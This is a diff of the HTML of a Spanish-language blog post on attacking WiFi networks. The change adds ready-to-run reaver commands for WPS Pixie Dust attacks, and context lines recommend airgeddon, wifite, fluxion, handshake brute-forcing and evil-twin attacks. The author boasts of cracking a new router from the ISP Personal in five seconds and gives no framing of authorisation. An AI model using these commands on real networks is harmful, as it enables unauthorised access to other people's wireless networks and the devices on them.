@@ -9,11 +9,10 @@
   <meta property="og:url" content="https://imlauera.github.io/post/atacando_wifis/">
   <meta property="og:site_name" content="Imlauer">
   <meta property="og:title" content="Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.">
-  <meta property="og:description" content="Airgeddon captura handshakes rotos es mejor usar hcxdumptool Quizás en un futuro mejore, pero hasta ahora es así.
-Bajate BlackArch, KaliLinux o si tenés Arch agregale el repo de BlackArch. Instalá wifite, airgeddon, fluxion.
-Si querés usar airgeddon sin interfaz gráfica:
-sudo su export AIRGEDDON_WINDOWS_HANDLING=tmux airgeddon Más info acá: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Options
-sudo wifite sudo airgeddon Podés capturar el handshare y intentar romperlo usando diccionarios, fuerza bruta con airgeddon, creando gemelo malvado. Podes crear diccionarios específicos así:">
+  <meta property="og:description" content="Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.
+sudo reaver -i wlan0 -b mac_address -c canal -K 1 -Z -vvv Si te falla pasamos a:
+sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d 10 -r 3:15 -T .5 -vv Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.
+Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.">
   <meta property="og:locale" content="es_es">
   <meta property="og:type" content="article">
     <meta property="article:section" content="post">
@@ -26,23 +25,21 @@ sudo wifite sudo airgeddon Podés capturar el handshare y intentar romperlo usan
 
   
   <meta itemprop="name" content="Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.">
-  <meta itemprop="description" content="Airgeddon captura handshakes rotos es mejor usar hcxdumptool Quizás en un futuro mejore, pero hasta ahora es así.
-Bajate BlackArch, KaliLinux o si tenés Arch agregale el repo de BlackArch. Instalá wifite, airgeddon, fluxion.
-Si querés usar airgeddon sin interfaz gráfica:
-sudo su export AIRGEDDON_WINDOWS_HANDLING=tmux airgeddon Más info acá: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Options
-sudo wifite sudo airgeddon Podés capturar el handshare y intentar romperlo usando diccionarios, fuerza bruta con airgeddon, creando gemelo malvado. Podes crear diccionarios específicos así:">
+  <meta itemprop="description" content="Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.
+sudo reaver -i wlan0 -b mac_address -c canal -K 1 -Z -vvv Si te falla pasamos a:
+sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d 10 -r 3:15 -T .5 -vv Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.
+Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.">
   <meta itemprop="datePublished" content="2024-07-21T19:48:09-03:00">
   <meta itemprop="dateModified" content="2024-07-21T19:48:09-03:00">
-  <meta itemprop="wordCount" content="4032">
+  <meta itemprop="wordCount" content="4117">
   <meta itemprop="keywords" content="Atacando,Redes,Ciberseguridad,Vulnerabilidades">
   
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas.">
-  <meta name="twitter:description" content="Airgeddon captura handshakes rotos es mejor usar hcxdumptool Quizás en un futuro mejore, pero hasta ahora es así.
-Bajate BlackArch, KaliLinux o si tenés Arch agregale el repo de BlackArch. Instalá wifite, airgeddon, fluxion.
-Si querés usar airgeddon sin interfaz gráfica:
-sudo su export AIRGEDDON_WINDOWS_HANDLING=tmux airgeddon Más info acá: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Options
-sudo wifite sudo airgeddon Podés capturar el handshare y intentar romperlo usando diccionarios, fuerza bruta con airgeddon, creando gemelo malvado. Podes crear diccionarios específicos así:">
+  <meta name="twitter:description" content="Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y es para cualquier distro.
+sudo reaver -i wlan0 -b mac_address -c canal -K 1 -Z -vvv Si te falla pasamos a:
+sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d 10 -r 3:15 -T .5 -vv Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.
+Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.">
 
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -60,18 +57,13 @@ sudo wifite sudo airgeddon Podés capturar el handshare y intentar romperlo usan
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="referrer" content="no-referrer">
   <meta name="author" content="Imlauer.">
-  <meta name="description" content="Airgeddon captura handshakes rotos es mejor usar hcxdumptool
-Quizás en un futuro mejore, pero hasta ahora es así.
-Bajate BlackArch, KaliLinux o si tenés Arch agregale el repo de BlackArch.
-Instalá wifite, airgeddon, fluxion.
-Si querés usar airgeddon sin interfaz gráfica:
-sudo su
-export AIRGEDDON_WINDOWS_HANDLING=tmux
-airgeddon
-Más info acá: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Options
-sudo wifite
-sudo airgeddon
-Podés capturar el handshare y intentar romperlo usando diccionarios, fuerza bruta con airgeddon, creando gemelo malvado. Podes crear diccionarios específicos así:">
+  <meta name="description" content="Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y
+es para cualquier distro.
+sudo reaver -i wlan0 -b mac_address -c canal -K 1 -Z -vvv
+Si te falla pasamos a:
+sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d 10 -r 3:15 -T .5 -vv
+Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.
+Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.">
 </head>
 <body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
   <div class="navbar-brand">
@@ -134,7 +126,15 @@ Podés capturar el handshare y intentar romperlo usando diccionarios, fuerza bru
     <section class="section">
       <div class="container">
 <div class="content is-medium">
-  <h4 id="airgeddon-captura-handshakes-rotos-es-mejor-usar-hcxdumptool">Airgeddon captura handshakes rotos es mejor usar hcxdumptool</h4>
+  <p>Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y
+es para cualquier distro.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo reaver -i wlan0 -b mac_address -c canal -K <span style="color:#ae81ff">1</span> -Z -vvv
+</span></span></code></pre></div><p>Si te falla pasamos a:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d <span style="color:#ae81ff">10</span> -r 3:15 -T .5 -vv
+</span></span></code></pre></div><p>Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.</p>
+<p>Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.</p>
+<hr>
+<h4 id="airgeddon-captura-handshakes-rotos-es-mejor-usar-hcxdumptool">Airgeddon captura handshakes rotos es mejor usar hcxdumptool</h4>
 <p>Quizás en un futuro mejore, pero hasta ahora es así.</p>
 <p>Bajate BlackArch, KaliLinux o si tenés Arch agregale el repo de BlackArch.
 Instalá wifite, airgeddon, fluxion.</p>
